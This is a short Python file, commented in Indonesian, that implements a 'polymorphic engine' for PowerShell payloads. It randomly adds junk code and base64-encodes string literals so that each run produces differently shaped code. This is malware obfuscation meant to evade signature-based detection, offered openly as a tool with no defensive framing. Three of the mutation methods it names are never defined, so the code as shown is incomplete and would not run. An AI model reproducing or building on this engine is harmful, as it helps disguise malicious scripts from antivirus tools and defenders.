# 🔴 Polymorphic Engine - Kode berubah setiap execute
import random
import base64
import zlib

class PolymorphicEngine:
    def __init__(self, payload):
        self.payload = payload
        self.mutations = [
            self.add_junk_code,
            self.rename_variables,
            self.change_order,
            self.encrypt_strings,
            self.split_arrays
        ]
    
    def mutate(self):
        mutated = self.payload
        for _ in range(random.randint(3, 7)):
            mutation = random.choice(self.mutations)
            mutated = mutation(mutated)
        return mutated
    
    def add_junk_code(self, code):
        junk = [
            "if (Get-Date).DayOfWeek -eq 'Monday' { $null = 1..1000 }",
            "$x = 1; while ($x -lt 10) { $x++ }",
            "Get-Process | Out-Null",
            "[System.GC]::Collect()"
        ]
        return random.choice(junk) + "\n" + code + "\n" + random.choice(junk)
    
    def encrypt_strings(self, code):
        import re
        strings = re.findall(r'["\'](.*?)["\']', code)
        for s in strings:
            if len(s) > 3:
                encoded = base64.b64encode(s.encode()).decode()
                replacement = f'[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("{encoded}"))'
                code = code.replace(f'"{s}"', replacement)
        return code